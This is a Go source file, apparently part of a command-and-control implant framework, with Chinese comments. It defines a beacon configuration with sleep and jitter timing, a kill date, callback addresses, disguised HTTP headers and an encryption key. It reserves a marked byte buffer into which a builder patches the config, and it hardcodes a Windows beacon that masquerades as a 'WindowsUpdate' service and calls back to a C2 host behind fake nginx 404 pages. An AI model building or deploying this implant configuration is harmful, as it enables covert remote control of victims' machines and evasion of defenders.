package profile

// CONFIG_MARKER_2024 + 5120 字节空洞
var placeholder = [5120]byte{
	'C', 'O', 'N', 'F', 'I', 'G', '_', 'M', 'A', 'R',
	'K', 'E', 'R', '_', '2', '0', '2', '4',
}

const (
	COMMAND_CAT          = 1
	COMMAND_CD           = 2
	COMMAND_ERROR_REPORT = 100
)

var BeaconProfile BeaconGenerateConfig

type BeaconGenerateConfig struct {
	// 来自 GenerateConfig
	Os            string `json:"os"`
	Arch          string `json:"arch"`
	Format        string `json:"format"`
	Sleep         int    `json:"sleep"`
	Jitter        int    `json:"jitter"`
	SvcName       string `json:"svcname"`
	IsKillDate    bool   `json:"is_killdate"`
	Killdate      string `json:"kill_date"`
	Killtime      string `json:"kill_time"`
	IsWorkingTime bool   `json:"is_workingtime"`
	StartTime     string `json:"start_time"`
	EndTime       string `json:"end_time"`

	// 来自 ConfigDetail（去掉 SSLCertPath 、 SSLKeyPath、PageError）
	HostBind          string            `json:"host_bind"`
	PortBind          int               `json:"port_bind"`
	CallbackAddresses []string          `json:"callback_addresses"`
	SSL               bool              `json:"ssl"`
	SSLCert           []byte            `json:"ssl_cert,omitempty"`
	SSLKey            []byte            `json:"ssl_key,omitempty"`
	HTTPMethod        string            `json:"http_method"`
	URI               string            `json:"uri"`
	HBHeader          string            `json:"hb_header"`
	HBPrefix          string            `json:"hb_prefix"`
	UserAgent         string            `json:"user_agent"`
	HostHeader        string            `json:"host_header"`
	RequestHeaders    map[string]string `json:"request_headers,omitempty"`
	ResponseHeaders   map[string]string `json:"response_headers,omitempty"`
	XForwardedFor     bool              `json:"x_forwarded_for"`
	PageError         string            `json:"page_error"`
	ServerHeaders     map[string]string `json:"server_headers,omitempty"`
	Protocol          string            `json:"protocol"`
	EncryptKey        []byte            `json:"encrypt_key,omitempty"`
}

// 运行时读取并反序列化

/*
func LoadConfig() (BeaconGenerateConfig, error) {

	// 检查
	if len(placeholder) < 4 {
		return BeaconGenerateConfig{}, fmt.Errorf("buffer too small")
	}

	// 读取json长度
	lengthBytes := placeholder[:4]
	length := binary.LittleEndian.Uint32(lengthBytes)
	if length == 0 {
		return BeaconGenerateConfig{}, fmt.Errorf("no config embedded")
	}

	// 检查
	end := 4 + int(length)
	if end > len(placeholder) {
		return BeaconGenerateConfig{}, fmt.Errorf("invalid length")
	}

	// 反序列化json
	var cfg BeaconGenerateConfig
	if err := json.Unmarshal(placeholder[4:end], &cfg); err != nil {
		return BeaconGenerateConfig{}, err
	}
	println(string(placeholder[4:end]))
	return cfg, nil
}
*/

func LoadConfig() (BeaconGenerateConfig, error) {
	cfg := BeaconGenerateConfig{
		// 来自 GenerateConfig
		Os:            "windows",
		Arch:          "x64",
		Format:        "exe",
		Sleep:         5,
		Jitter:        20,
		SvcName:       "WindowsUpdate",
		IsKillDate:    true,
		Killdate:      "2024-12-31",
		Killtime:      "23:59",
		IsWorkingTime: false,
		StartTime:     "09:00",
		EndTime:       "18:00",

		// 来自 ConfigDetail
		HostBind:          "0.0.0.0",
		PortBind:          443,
		CallbackAddresses: []string{"http://192.168.1.1:9000"},
		SSL:               true,
		SSLCert:           []byte{}, // 可放真实证书
		SSLKey:            []byte{}, // 可放真实私钥
		URI:               "index.php",
		HBHeader:          "X-Session-Id",
		HBPrefix:          "SESSIONID=",
		UserAgent:         "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
		HostHeader:        "c2.example.com",
		RequestHeaders: map[string]string{
			"Accept": "application/json",
		},
		ResponseHeaders: map[string]string{
			"Content-Type": "application/json",
		},
		XForwardedFor: false,
		PageError:     "<html><body>404 Not Found</body></html>", // 这里要注意
		ServerHeaders: map[string]string{
			"Server": "nginx/1.18.0",
		},
		Protocol:   "https",
		EncryptKey: []byte("01234567890123456789"), // RC4/AES 密钥示例
	}
	return cfg, nil
}
